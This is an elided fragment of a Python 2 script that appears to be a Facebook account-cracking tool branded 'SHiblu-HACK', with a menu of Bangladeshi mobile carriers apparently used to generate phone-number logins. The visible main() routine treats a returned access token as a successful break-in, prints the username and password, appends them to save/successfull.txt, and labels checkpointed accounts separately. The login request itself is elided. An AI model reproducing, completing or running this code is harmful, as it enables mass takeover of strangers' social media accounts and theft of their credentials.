...
logo = '\x1b[1;97m--------------------------------------------------\n      ---> Create to by -> Shiblu Khan  <--- \n\x1b[1;97m-------------------------------------------------- \n\x1b[1;97m     Facebook -> facebook.com/SHiblu.2009 \x1b[00m\n\x1b[1;97m--------------------------------------------------\n    ---> Github -> github.com/SHiblu-120 <--- \n\x1b[1;97m--------------------------------------------------'
...
def menu():
    ...
    print '\x1b[1;91mAUTHOR  : Shiblu'
    print '\x1b[1;91mFACEBOOK : Md. Abdullah Al Mamun'
    print '\x1b[1;91mGITHUB  : github.com/Shiblu-120'
    print ''
    print 50* '-'
    print '\x1b[1;94m--------------------------------------------------'
    print
    ...
    print '\x1b[1;92m[2]  AIRTEL(SHIBLU)'
    print '\x1b[1;92m[3]  BANGLALINK(OLD)'
    print '\x1b[1;92m[4]  BANGLALINK(NEW)'
    print '\x1b[1;92m[5]  GRAMEEN(SHIBLU)'
    print '\x1b[1;92m[6]  TELETALK(SHIBLU)'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[SHiblu-HACK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[SHiblu-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login 7 Days]\x1b[0m \n'
